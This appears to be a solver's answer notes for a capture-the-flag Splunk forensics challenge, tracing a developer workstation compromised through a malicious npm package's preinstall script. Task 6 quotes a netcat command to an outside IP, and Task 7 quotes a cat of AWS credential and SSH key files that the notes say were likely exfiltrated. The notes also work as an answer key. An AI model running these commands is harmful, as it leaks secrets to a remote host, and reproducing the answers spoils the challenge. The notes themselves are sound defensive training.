@@ -1,0 +1,81 @@
+Task 1
+
+Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use.
+
+Provided sample search:
+index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie 
+| stats count by CommandLine 
+| sort - count
+Answer: git status
+
+Task 2
+
+Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one!
+
+
+index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie remote origin partnerapi
+latest command/last run has answer; switched from https to ssh on remote repo
+
+Answer: git@github.com:elfnp3/partnerapi.git
+
+Task 3
+
+The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation.
+
+searched for docker events
+
+Answer: docker compose up
+
+Task 4
+
+Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository.
+
+checked index=* and found sourcetype=github_json
+looked at the respositoyr.clone_url and checked the github.com/elfnp3 page and found reference to dvws-node.git.
+went to the repo and then moved up to the parent it was cloned from
+
+
+Answer: https://github.com/snoopysecurity/dvws-node
+
+Task 5
+
+Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation.
+
+searched index=* for npm and looked at command lines
+saw npm install holiday-utils-js run
+
+answer: holiday-utils-js
+
+Task 6
+
+Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious.
+
+traffic was on two ports, one was related to github, port 16842 was anomalous
+looking at events with that pid saw th command nc -ql 54.175.69.219 16842 was run
+searched for that command line and found associated process_name = /usr/bin/nc.openbsd
+
+answer: /usr/bin/nc.openbsd
+
+Task 7
+
+Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here.
+
+index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational user=eddie parent_process_id=6788
+see commandline for pid 6790
+cat to 6 files
+>cat /home/eddie/.aws/credentials /home/eddie/.ssh/authorized_keys /home/eddie/.ssh/config /home/eddie/.ssh/eddie /home/eddie/.ssh/eddie.pub /home/eddie/.ssh/known_hosts
+
+answer: 6
+
+Task 8
+
+Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address.
+
+
+answer: preinstall.sh
+checked the PPID of the cat process
+alt: check for CommandLine containing .sh
+
+
+
+Thank you for helping Santa complete his investigation! Santa says you're a whiz!
